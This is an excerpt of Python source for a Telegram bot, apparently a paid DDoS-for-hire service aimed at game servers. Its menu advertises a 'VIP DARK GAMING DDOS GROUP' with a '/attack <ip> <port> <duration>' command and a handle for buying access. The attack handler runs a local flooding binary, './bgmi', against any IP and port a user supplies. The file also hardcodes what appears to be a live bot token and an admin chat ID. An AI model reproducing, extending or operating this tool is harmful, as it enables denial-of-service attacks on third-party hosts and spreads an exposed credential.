...
TELEGRAM_BOT_TOKEN = '7619302375:AAHrO9GfVDePQBpQ-vJ-ZBxhh3kB4JL8Yaw'
ADMIN_USER_ID = -1002484355392
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "*😈 VIP DARK GAMING DDOS GROUP 😈*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "* DM TO BUY :- @VIP_GAMING_315 *"
    )
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./bgmi {ip} {port} {duration} 800"
...
async def attack(update: Update, context: CallbackContext):
    ...
    await context.bot.send_message(chat_id=chat_id, text=(
        ...
        f"*🔥 Join :- https://t.me/+Fqz6WVWiEaszNzU9 DDOS 💥*"
    ), parse_mode='Markdown')
